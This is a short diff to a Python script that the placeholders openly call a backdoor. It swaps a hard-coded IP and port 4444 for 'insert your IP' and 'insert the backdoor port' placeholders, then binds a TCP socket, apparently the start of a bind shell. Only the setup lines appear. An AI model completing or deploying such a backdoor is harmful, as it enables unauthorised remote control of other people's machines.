@@ -1,8 +1,8 @@
 import socket
 import subprocess
 
-target_host = '192.168.56.1'
-target_port = 4444
+target_host = 'INSIRA_SEU_IP'
+target_port = INSIRA_A_PORTA_DO_BACKDOOR
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind((target_host, target_port))
